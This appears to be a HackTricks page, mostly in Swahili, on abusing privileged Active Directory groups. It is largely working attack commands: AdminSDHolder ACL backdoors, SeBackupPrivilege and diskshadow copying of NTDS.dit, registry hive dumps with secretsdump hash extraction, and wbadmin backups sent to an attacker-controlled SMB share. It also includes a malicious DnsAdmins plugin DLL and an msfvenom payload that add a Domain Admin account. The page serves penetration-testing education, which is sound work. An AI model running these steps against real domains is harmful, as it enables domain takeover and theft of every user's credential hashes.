# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Well Known groups with administration privileges

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Domain Controller (DC).

Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwa ndani kwenye DC01.

## Kundi la AdminSDHolder

Orodha ya Udhibiti wa Ufikiaji (ACL) ya kundi la **AdminSDHolder** ni muhimu kwani inaweka ruhusa kwa "vikundi vilivyolindwa" ndani ya Active Directory, ikiwa ni pamoja na vikundi vyenye mamlaka ya juu. Mekanismu hii inahakikisha usalama wa vikundi hivi kwa kuzuia mabadiliko yasiyoruhusiwa.

Mshambuliaji anaweza kutumia hili kwa kubadilisha ACL ya kundi la **AdminSDHolder**, akitoa ruhusa kamili kwa mtumiaji wa kawaida. Hii itampa mtumiaji huyo udhibiti kamili juu ya vikundi vyote vilivyolindwa. Ikiwa ruhusa za mtumiaji huyu zitabadilishwa au kuondolewa, zitarudishwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.

Amri za kupitia wanachama na kubadilisha ruhusa ni:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Inapatikana skripti ili kuharakisha mchakato wa urejeleaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Uanachama katika kundi hili unaruhusu kusoma vitu vilivyofutwa vya Active Directory, ambavyo vinaweza kufichua taarifa nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domain Controller Access

Upatikanaji wa faili kwenye DC umewekwa mipaka isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha upatikanaji.

### Privilege Escalation

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kuchunguza na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, kuruhusu utekelezaji wa amri za kiholela na kupandisha hadhi:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inaonyesha kwamba `Server Operators` wana ufikiaji kamili, wakiruhusu kubadilisha huduma kwa ajili ya haki za juu.

## Backup Operators

Uanachama katika kundi la `Backup Operators` unatoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na haki za `SeBackup` na `SeRestore`. Haki hizi zinaruhusu kupita kwenye folda, kuorodhesha, na uwezo wa kunakili faili, hata bila ruhusa maalum, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia scripts maalum ni muhimu kwa mchakato huu.

Ili kuorodhesha wanachama wa kundi, tekeleza:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

Ili kutumia haki hizi kwa ndani, hatua zifuatazo zinatumika:

1. Ingiza maktaba muhimu:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Wezesha na thibitisha `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pata na nakili faili kutoka kwa saraka zilizo na vizuizi, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Upatikanaji wa moja kwa moja wa mfumo wa faili wa Domain Controller unaruhusu wizi wa hifadhidata ya `NTDS.dit`, ambayo ina hash zote za NTLM za watumiaji na kompyuta za eneo.

#### Using diskshadow.exe

1. Create a shadow copy of the `C` drive:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwa nakala ya kivuli:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Mbali na hayo, tumia `robocopy` kwa ajili ya nakala za faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Toa `SYSTEM` na `SAM` kwa ajili ya kupata hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata hash zote kutoka `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Kutumia wbadmin.exe

1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akreditivu za SMB kwenye mashine lengwa.
2. Tumia `wbadmin.exe` kwa ajili ya akiba ya mfumo na uchimbaji wa `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Kwa maonyesho ya vitendo, angalia [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka kwa haki za SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wasimamizi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi.

Ili orodhesha wajumbe wa kundi la DnsAdmins, tumia:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Teua DLL isiyokuwa na mipaka

Wajumbe wanaweza kufanya seva ya DNS kupakia DLL isiyokuwa na mipaka (iwe kwa ndani au kutoka kwa sehemu ya mbali) kwa kutumia amri kama:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanza upya huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL iweze kupakiwa:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu njia hii ya shambulio, rejelea ired.team.

#### Mimilib.dll

Pia inawezekana kutumia mimilib.dll kwa ajili ya utekelezaji wa amri, kuibadilisha ili kutekeleza amri maalum au shells za kurudi. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.

### WPAD Record kwa MitM

DnsAdmins wanaweza kubadilisha rekodi za DNS ili kufanya shambulio la Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kuzuia maswali ya kimataifa. Zana kama Responder au Inveigh zinaweza kutumika kwa ajili ya kudanganya na kukamata trafiki ya mtandao.

### Wasilishi wa Kumbukumbu za Matukio
Wajumbe wanaweza kufikia kumbukumbu za matukio, huenda wakapata taarifa nyeti kama nywila za maandiko au maelezo ya utekelezaji wa amri:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Kikundi hiki kinaweza kubadilisha DACLs kwenye kituo cha kikoa, huenda kikatoa ruhusa za DCSync. Mbinu za kupandisha hadhi zinazotumia kikundi hiki zimeelezewa katika repo ya Exchange-AD-Privesc ya GitHub.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Wataalam wa Hyper-V

Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambayo inaweza kutumika kuteka udhibiti wa Wasimamizi wa Kikoa wa virtual. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.

### Mfano wa Kutumia

Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumika na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyo na ulinzi na kuibadilisha na executable mbaya:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Utekelezaji wa kiungo kigumu umepunguziliwa mbali katika sasisho za hivi karibuni za Windows.

## Usimamizi wa Shirika

Katika mazingira ambapo **Microsoft Exchange** imewekwa, kundi maalum linalojulikana kama **Usimamizi wa Shirika** lina uwezo mkubwa. Kundi hili lina haki ya **kufikia sanduku la barua la watumiaji wote wa kikoa** na lina **udhibiti kamili juu ya 'Makundi ya Usalama ya Microsoft Exchange'** Kitengo cha Shirika (OU). Udhibiti huu unajumuisha kundi la **`Exchange Windows Permissions`**, ambalo linaweza kutumika kwa ajili ya kupandisha hadhi.

### Utekelezaji wa Haki na Amri

#### Opereta wa Print

Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kidhibiti cha Kikoa**, kuifunga, na kusimamia printa. Ili kutumia haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na hadhi, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.

Ili kuorodhesha wajumbe wa kundi hili, amri ifuatayo ya PowerShell inatumika:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwa mbinu za kina za unyakuzi zinazohusiana na **`SeLoadDriverPrivilege`**, mtu anapaswa kutafuta rasilimali maalum za usalama.

#### Watumiaji wa Desktop ya Kijijini

Wajumbe wa kundi hili wanapewa ufikiaji wa PCs kupitia Protokali ya Desktop ya Kijijini (RDP). Ili kuhesabu wajumbe hawa, amri za PowerShell zinapatikana:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maelezo zaidi kuhusu kutumia RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Watumiaji wa Usimamizi wa Kijijini

Wajumbe wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Uhesabu wa wajumbe hawa unafanywa kupitia:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Kwa mbinu za unyakuzi zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kutumika.

#### Watoa Huduma wa Seva

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Wasimamizi wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo. Ili kuhesabu wanachama, amri iliyotolewa ni:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
